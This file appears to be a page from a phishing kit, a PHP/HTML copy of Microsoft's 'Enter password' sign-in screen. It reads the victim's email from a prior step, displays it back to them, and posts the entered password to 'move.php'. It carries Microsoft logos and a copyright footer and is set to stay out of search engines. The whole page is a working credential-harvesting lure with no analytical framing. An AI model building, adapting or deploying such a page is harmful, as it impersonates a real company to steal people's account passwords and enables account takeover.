<?php
$email = $_POST['email'];
?>

<?php
session_start();
if(isset($_POST['submit'])) {


$email = $_POST['email'];

$_SESSION["email"]= $email;}
include "rtw.php";
?>


<!DOCTYPE html>
<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    
  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <link rel="shortcut icon" href="img/icn.ico">    
<link crossorigin="anonymous" href="SignIn_files/converged.css" rel="stylesheet">
</head>








<body class="cb" style="display: block;">

<div>
 <div><div class="background" role="presentation">
 

 <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(img/bgd.jpg);"></div>
 
</div></div>

 <form name="f1" id="i0281" spellcheck="false" method="post" target="_top" autocomplete="off"  action=move.php>
 <div class="outer">
 <div class="middle">
 <div class="inner"> <div class="lightbox-cover" ></div>
 
 <div >
 <img class="logo" pngsrc="" svgsrc="" src="SignIn_files/llogo.svg" alt="Microsoft">
 </div>
 <div role="main">
 <div >

 <div> <div >
 <div class="identityBanner"><a href="contlnue.php">
 <button type="button" class="backButton" id="idBtn_Back" aria-label="Back">
 <img role="presentation" pngsrc="" svgsrc="" src="SignIn_files/arrowLeft.svg"> 
 </button></a>
 <!--##################################################-->

 <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="NO TITLE YET"><?php echo $_SESSION["email"] ?></div>
 </div></div> </div>
 <div class="pagination-view has-identity-banner">
 <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" >

  <input type="hidden" name="email"  value="<?=$email?>">
  
  
  <input type="text" name="loginfmt"  class="moveOffScreen" tabindex="-1" aria-hidden="true" > 

  <div id="loginHeader" class="row text-title" role="heading" aria-level="1" >Enter password</div>

  <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false">
  </div> <div class="placeholderContainer" >

  <input name="password" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="" required /> 
  
  </div> </div> </div>
  <div class="position-buttons">
  
  <div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> 
  <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#" >Forgot my password</a> </div>
  <div class="form-group">
							</div>
							</div> </div> </div> </div>
							
							
							<div class="row"> <div >
	<div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container">
	
	<div  class="inline-block"> 
	
	<!--###################################################-->
	<input type="submit" id="idSIButton9" class="btn btn-block btn-primary"  value="Sign in">


	</div> </div></div> </div></div></div>
							
							
							
							
							
							</div> </div></div> </div>
							 
							 <div >
							 </div> <div id="footer" class="footer default" role="contentinfo" > <div>
							 <div id="footerLinks" class="footerNode text-secondary">
							 <span id="ftrCopy">©2019 Microsoft</span> <a id="ftrTerms"  href="#">Terms of use</a> <a id="ftrPrivacy"  href="#">Privacy &amp; cookies</a>
							 <a href="#" role="button" class="moreOptions" d>
							 
							 <img class="desktopMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="SignIn_files/feet.svg">
							 <img class="mobileMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="SignIn_files/feet2.svg">
							 </a> </div>
							 </div> </div> </div> 
							 </div>
							 </form> 
							 
							 <form method="post" aria-hidden="true" target="_top" ></form>
							 <div id="idPartnerPL" ><iframe style="display: none;" src="SignIn_files/prefetch.htm" width="0" height="0"></iframe></div> </div></body></html>